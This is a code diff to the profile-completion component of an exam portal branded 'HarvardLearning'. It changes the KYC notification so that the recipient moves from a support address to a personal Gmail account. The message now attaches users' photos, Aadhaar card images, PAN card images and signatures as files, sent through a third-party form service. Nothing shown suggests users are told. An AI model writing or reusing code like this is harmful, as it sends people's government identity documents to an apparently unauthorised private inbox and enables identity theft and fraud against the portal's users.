@@ -267,17 +267,15 @@ const CompleteProfile = ({ profile, user, onComplete }) => {
     });
   };
 
-  const sendEmailNotification = async (candidateData) => {
+  const sendEmailNotification = async (candidateData, blobs) => {
     try {
-      await fetch('https://api.web3forms.com/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          access_key: import.meta.env.VITE_WEB3FORMS_ACCESS_KEY,
-          subject: `KYC FROM User:- ${profile.full_name}`,
-          from_name: "HarvardLearning Exam Portal",
-          to_email: "support@harvardlearning.com",
-          message: `
+      const formData = new FormData();
+      formData.append('access_key', import.meta.env.VITE_WEB3FORMS_ACCESS_KEY);
+      formData.append('subject', `KYC FROM User:- ${profile.full_name}`);
+      formData.append('from_name', "HarvardLearning Exam Portal");
+      formData.append('to_email', "kabirhaldar4444@gmail.com");
+      
+      const message = `
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 KYC VERIFICATION REPORT
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -390,25 +388,28 @@ ACCEPTED BY CANDIDATE: YES ✓
 
 DOCUMENT ACCESS LINKS:
 ─────────────────────
-• Profile Photo:
-${candidateData.photoUrl}
-
-• Aadhaar Card (Front):
-${candidateData.frontUrl}
-
-• Aadhaar Card (Back):
-${candidateData.backUrl}
-
-• PAN Card:
-${candidateData.panUrl}
-
-• Digital Signature:
-${candidateData.signUrl}
+• Profile Photo: ${candidateData.photoUrl}
+• Aadhaar Card (Front): ${candidateData.frontUrl}
+• Aadhaar Card (Back): ${candidateData.backUrl}
+• PAN Card: ${candidateData.panUrl}
+• Digital Signature: ${candidateData.signUrl}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Submitted via HarvardLearning Exam Portal 
-`
-        })
+`;
+
+      formData.append('message', message);
+
+      // Attach Blobs
+      if (blobs.photo) formData.append('attachment', blobs.photo, 'profile_photo.jpg');
+      if (blobs.front) formData.append('attachment', blobs.front, 'aadhaar_front.jpg');
+      if (blobs.back) formData.append('attachment', blobs.back, 'aadhaar_back.jpg');
+      if (blobs.pan) formData.append('attachment', blobs.pan, 'pan_card.jpg');
+      if (blobs.sign) formData.append('attachment', blobs.sign, 'signature.png');
+
+      await fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        body: formData
       });
     } catch (err) {
       console.error('Email Notification Error:', err);
@@ -500,6 +501,12 @@ Submitted via HarvardLearning Exam Portal
         signUrl,
         address: fullAddress,
         ipAddress: finalIP
+      }, {
+        photo: compPhoto,
+        front: compFront,
+        back: compBack,
+        pan: compPan,
+        sign: signatureBlob
       });
 
       if (onComplete) await onComplete();
